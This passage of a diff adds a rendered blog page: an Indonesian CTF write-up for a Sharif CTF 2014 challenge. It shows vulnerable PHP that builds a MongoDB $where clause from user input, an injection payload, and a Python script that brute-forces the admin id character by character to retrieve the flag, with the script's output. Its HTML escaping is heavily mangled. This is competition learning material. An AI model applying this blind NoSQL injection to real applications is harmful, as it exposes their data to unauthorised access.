+        &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Content-Type: application/json'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;"You are so fast. Please slow down. And wait for one minute."&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'count'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_SESSION&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'count'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="nv"&gt;$q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'q'&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'q'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$q&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'users'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$role&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'role'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="nv"&gt;$m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MongoClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$m&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;ctf5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$users_col&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;users&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$users&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$users_col&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+        &lt;span class="s1"&gt;'$where'&lt;/span&gt; &lt;span class="o"&gt;=&gt;&lt;/span&gt; &lt;span class="s2"&gt;"this.role == '&lt;/span&gt;&lt;span class="si"&gt;$role&lt;/span&gt;&lt;span class="s2"&gt;'"&lt;/span&gt;
+    &lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$users&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$names&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Content-Type: application/json'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$q&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'flag'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'id'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="nv"&gt;$m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MongoClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$m&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;ctf5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$flag_col&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$flag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$flag_col&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;findOne&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'_id'&lt;/span&gt; &lt;span class="o"&gt;=&gt;&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MongoId&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$id&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
+    &lt;span class="nb"&gt;var_dump&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$flag&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="cp"&gt;?&gt;&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p>fle api.php hanya bisa di buka ketika kita sudah login sehingga $_Session[id] != 0 , dan untuk mengakses file ini kita harus mengganti header dengan XMLHttpRequest</p>
+
+<p>Get parameter Q di gunakan untuk 2 value :</p>
+
+<p>– Untuk mendapatkan user dengan role yang di spesifikasaikan di GET role</p>
+
+<p>-Untuk mendapatkan flag dengan memasukan id dari role admin</p>
+
+<pre><code class="language-python" data-lang="python">&lt;span class="s"&gt;api.php?q=flag&amp;id=
+
+&lt;/span&gt;</code>Didalam File init.php admin user dan flag di insert pada waktu yang sama di mongodb kita dapat menganggap $id mereka berturut" jika kita bisa mendapatkan $id admin user maka kita akan mudah untuk mendapatkan $id flag
+
+Kesimpulannya kita mencari : - $id dari admin user , - masukan $id untuk dapatkan flag
+
+</pre>
+
+<blockquote>
+  <pre><code class="language-php" data-lang="php">&lt;span class="cp"&gt;&lt;?php&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$q&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'users'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$role&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'role'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="nv"&gt;$m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;MongoClient&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$m&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;ctf5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$users_col&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;users&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;$users&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$users_col&lt;/span&gt;&lt;span class="o"&gt;-&gt;&lt;/span&gt;&lt;span class="na"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+        &lt;span class="s1"&gt;'$where'&lt;/span&gt; &lt;span class="o"&gt;=&gt;&lt;/span&gt; &lt;span class="s2"&gt;"this.role == '&lt;/span&gt;&lt;span class="si"&gt;$role&lt;/span&gt;&lt;span class="s2"&gt;'"&lt;/span&gt;
+    &lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="nv"&gt;$names&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$users&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$names&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$user&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'username'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'Content-Type: application/json'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$names&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="cp"&gt;?&gt;&lt;/span&gt;</code></pre>
+</blockquote>
+
+<p> </p>
+
+<p>kita akan melakukan blind mongodb injection untuk menebak dari $id dan memanfaatkan oracle response</p>
+
+<blockquote>
+  <p>api.php?q=user&amp;role=admin’ &amp;&amp; (this._id.str[x]==’Y’) &amp;&amp; ‘1’==’1</p>
+</blockquote>
+
+<p>x dan y adalah yang akan di rubah untuk bruteforce .. ketika response dari oracle == 9 maka digit itu benar kemudian lanjut ke digit selanjutnya</p>
+
+<p>disini pakai python untuk mengimplementasikan attacknya</p>
+
+<blockquote>
+  <pre><code class="language-python" data-lang="python">&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
+</code></pre>
+</blockquote>
+
+<p>&lt;span class=”kn”&gt;import&lt;/span&gt; &lt;span class=”nn”&gt;urllib&lt;/span&gt;
+&lt;span class=”kn”&gt;import&lt;/span&gt; &lt;span class=”nn”&gt;requests&lt;/span&gt;
+&lt;span class=”kn”&gt;import&lt;/span&gt; &lt;span class=”nn”&gt;time&lt;/span&gt;</p>
+
+<p>&lt;span class=”n”&gt;baseUrl&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s”&gt;”http://ctf.sharif.edu:25489/api.php?q=users&amp;role=”&lt;/span&gt;
+&lt;span class=”n”&gt;headers&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”p”&gt;{&lt;/span&gt;&lt;span class=”s”&gt;’X-Requested-With’&lt;/span&gt;&lt;span class=”p”&gt;:&lt;/span&gt; &lt;span class=”s”&gt;’XMLHttpRequest’&lt;/span&gt;&lt;span class=”p”&gt;}&lt;/span&gt;
+&lt;span class=”n”&gt;cookies&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”nb”&gt;dict&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;PHPSESSID&lt;/span&gt;&lt;span class=”o”&gt;=&lt;/span&gt;&lt;span class=”s”&gt;’amuedn0ra3fhj0diatdb4kkkt1’&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+&lt;span class=”n”&gt;admin_id&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s”&gt;’‘&lt;/span&gt;</p>
+
+<p>&lt;span class=”c”&gt;# Guessing admin id&lt;/span&gt;
+&lt;span class=”k”&gt;for&lt;/span&gt; &lt;span class=”n”&gt;c&lt;/span&gt; &lt;span class=”ow”&gt;in&lt;/span&gt; &lt;span class=”nb”&gt;range&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”mi”&gt;0&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”mi”&gt;24&lt;/span&gt;&lt;span class=”p”&gt;):&lt;/span&gt;
+    &lt;span class=”k”&gt;print&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”s”&gt;”[*] Guessing character “&lt;/span&gt;&lt;span class=”o”&gt;+&lt;/span&gt;&lt;span class=”nb”&gt;str&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;c&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”mi”&gt;1&lt;/span&gt;&lt;span class=”p”&gt;))&lt;/span&gt;
+    &lt;span class=”k”&gt;for&lt;/span&gt; &lt;span class=”n”&gt;x&lt;/span&gt; &lt;span class=”ow”&gt;in&lt;/span&gt; &lt;span class=”nb”&gt;range&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”mh”&gt;0x10&lt;/span&gt;&lt;span class=”p”&gt;):&lt;/span&gt;
+        &lt;span class=”n”&gt;letter&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;format&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;x&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt;&lt;span class=”s”&gt;’x’&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+        &lt;span class=”n”&gt;query&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s”&gt;”admin’ &amp;&amp; (this._id.str[“&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”nb”&gt;str&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;c&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”s”&gt;”]==’“&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”n”&gt;letter&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”s”&gt;”’) &amp;&amp; ‘1’==’1”&lt;/span&gt;
+        &lt;span class=”n”&gt;url&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;baseUrl&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”n”&gt;urllib&lt;/span&gt;&lt;span class=”o”&gt;.&lt;/span&gt;&lt;span class=”n”&gt;quote_plus&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;query&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+        &lt;span class=”n”&gt;response&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;requests&lt;/span&gt;&lt;span class=”o”&gt;.&lt;/span&gt;&lt;span class=”n”&gt;get&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;url&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”n”&gt;headers&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;headers&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”n”&gt;cookies&lt;/span&gt;&lt;span class=”o”&gt;=&lt;/span&gt;&lt;span class=”n”&gt;cookies&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+        &lt;span class=”k”&gt;if&lt;/span&gt; &lt;span class=”nb”&gt;len&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;response&lt;/span&gt;&lt;span class=”o”&gt;.&lt;/span&gt;&lt;span class=”n”&gt;text&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;&lt;span class=”o”&gt;==&lt;/span&gt;&lt;span class=”mi”&gt;9&lt;/span&gt;&lt;span class=”p”&gt;:&lt;/span&gt;
+            &lt;span class=”n”&gt;admin_id&lt;/span&gt; &lt;span class=”o”&gt;+=&lt;/span&gt; &lt;span class=”n”&gt;format&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;x&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”s”&gt;’x’&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+            &lt;span class=”k”&gt;print&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”s”&gt;”    + Admin id guessed: “&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”n”&gt;admin_id&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+            &lt;span class=”k”&gt;print&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”s”&gt;”“&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+            &lt;span class=”k”&gt;break&lt;/span&gt;</p>
+
+<pre><code>    &amp;lt;span class="n"&gt;time&amp;lt;/span&gt;&amp;lt;span class="o"&gt;.&amp;lt;/span&gt;&amp;lt;span class="n"&gt;sleep&amp;lt;/span&gt;&amp;lt;span class="p"&gt;(&amp;lt;/span&gt;&amp;lt;span class="mi"&gt;1&amp;lt;/span&gt;&amp;lt;span class="p"&gt;)&amp;lt;/span&gt;
+</code></pre>
+
+<p>&lt;span class=”c”&gt;# Getting the flag&lt;/span&gt;
+&lt;span class=”k”&gt;print&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”s”&gt;”[*] Go for the flag!”&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+&lt;span class=”n”&gt;flag_id&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;format&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”nb”&gt;int&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;admin_id&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”mi”&gt;16&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt; &lt;span class=”o”&gt;+&lt;/span&gt; &lt;span class=”mi”&gt;1&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”s”&gt;’x’&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+&lt;span class=”n”&gt;url&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”s”&gt;”http://ctf.sharif.edu:25489/api.php?q=flag&amp;id=”&lt;/span&gt;&lt;span class=”o”&gt;+&lt;/span&gt;&lt;span class=”n”&gt;flag_id&lt;/span&gt;
+&lt;span class=”n”&gt;response&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;requests&lt;/span&gt;&lt;span class=”o”&gt;.&lt;/span&gt;&lt;span class=”n”&gt;get&lt;/span&gt;&lt;span class=”p”&gt;(&lt;/span&gt;&lt;span class=”n”&gt;url&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”n”&gt;headers&lt;/span&gt; &lt;span class=”o”&gt;=&lt;/span&gt; &lt;span class=”n”&gt;headers&lt;/span&gt;&lt;span class=”p”&gt;,&lt;/span&gt; &lt;span class=”n”&gt;cookies&lt;/span&gt;&lt;span class=”o”&gt;=&lt;/span&gt;&lt;span class=”n”&gt;cookies&lt;/span&gt;&lt;span class=”p”&gt;)&lt;/span&gt;
+&lt;span class=”k”&gt;print&lt;/span&gt; &lt;span class=”n”&gt;response&lt;/span&gt;&lt;span class=”o”&gt;.&lt;/span&gt;&lt;span class=”n”&gt;text
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+<blockquote>
+
+  <pre><code class="language-bash" data-lang="bash">&lt;span class="c"&gt;# ./sharif14_pwnit.py&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Guessing character 1
+    + Admin id guessed: 5
+</code></pre>
+</blockquote>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;*&lt;span class=”o”&gt;]&lt;/span&gt; Guessing character 2
+    + Admin id guessed: 53</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;…&lt;span class=”o”&gt;]&lt;/span&gt;</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;*&lt;span class=”o”&gt;]&lt;/span&gt; Guessing character 23
+    + Admin id guessed: 53fadd3d7137a495319e10f</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;*&lt;span class=”o”&gt;]&lt;/span&gt; Guessing character 24
+    + Admin id guessed: 53fadd3d7137a495319e10f3</p>
+
+<p>&lt;span class=”o”&gt;[&lt;/span&gt;*&lt;span class=”o”&gt;]&lt;/span&gt; Go &lt;span class=”k”&gt;for&lt;/span&gt; the flag!</p>
+
+<p>array&lt;span class=”o”&gt;(&lt;/span&gt;2&lt;span class=”o”&gt;)&lt;/span&gt; &lt;span class=”o”&gt;{&lt;/span&gt;
+  &lt;span class=”o”&gt;[&lt;/span&gt;&lt;span class=”s2”&gt;”_id”&lt;/span&gt;&lt;span class=”o”&gt;]=&lt;/span&gt;&gt;
+  object&lt;span class=”o”&gt;(&lt;/span&gt;MongoId&lt;span class=”o”&gt;)&lt;/span&gt;&lt;span class=”c”&gt;#7 (1) {&lt;/span&gt;
+    &lt;span class=”o”&gt;[&lt;/span&gt;&lt;span class=”s2”&gt;”$id”&lt;/span&gt;&lt;span class=”o”&gt;]=&lt;/span&gt;&gt;
+    string&lt;span class=”o”&gt;(&lt;/span&gt;24&lt;span class=”o”&gt;)&lt;/span&gt; &lt;span class=”s2”&gt;”53fadd3d7137a495319e10f4”&lt;/span&gt;
+  &lt;span class=”o”&gt;}&lt;/span&gt;
+  &lt;span class=”o”&gt;[&lt;/span&gt;&lt;span class=”s2”&gt;”flag”&lt;/span&gt;&lt;span class=”o”&gt;]=&lt;/span&gt;&gt;
+  string&lt;span class=”o”&gt;(&lt;/span&gt;30&lt;span class=”o”&gt;)&lt;/span&gt; &lt;span class=”s2”&gt;”9fmTOOdbm1A76o40Bb9N3wpqvozdJI”&lt;/span&gt;
+&lt;span class=”o”&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</p>
+
+<p>Source : <a title="Blog Dul Ac" href="http://blog.dul.ac/2014/10/SHARIF_QUALS_14/" target="_blank">http://blog.dul.ac/2014/10/SHARIF_QUALS_14/</a></p>
+</div>
+        </article>
+        <div class="cf"></div>
+        <div class="row text-center">
+            <section class="notepad-post-share">
+                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Mongo Db Injection | Sharif CTF | Indonesian Backtrack Gathering&quot;%20http://localhost:4000/2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/%20via%20&#64;abdilahrf"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
+                    <i class="fa fa-twitter"></i>
+                </a>
+                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
+                    <i class="fa fa-facebook"></i>
+                </a>
+                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/2014/10/mongo-db-injection-sharif-ctf-indonesian-backtrack-gathering/"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
+                    <i class="fa fa-google-plus"></i>
+                </a>
+            </section>
+        </div>
+        <div class="cf"></div>
+        
+            <div class="notepad-author-info">
+                <div class="row">
+                    <section class="notepad-post-author small-12 columns">
+                        
+                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
+                        
+                        
+                            <span class="author-label">Author</span>
+                            <h1>Abdillah Muhamad</h1>
+                        
+                        
+                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
+                        
+                        
+                            <p>Coffe make you like a hero</p>
+                        
+                    </section>
+                </div>
+            </div>
+ 
+        
+        <div class="cf"></div>
+        
+        <div class="cf"></div>
+
+    <footer class="notepad-site-footer">
+    <div class="copyright">
+         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2017 &bull; All rights reserved.</section>
+         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
+    </div>
+    <div class="social-icons">
+        
+        
+        <a href="http://twitter.com/abdilahrf">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-twitter fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        <a href="https://plus.google.com/">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-google-plus fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        
+        <a href="http://github.com/abdilahrf">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
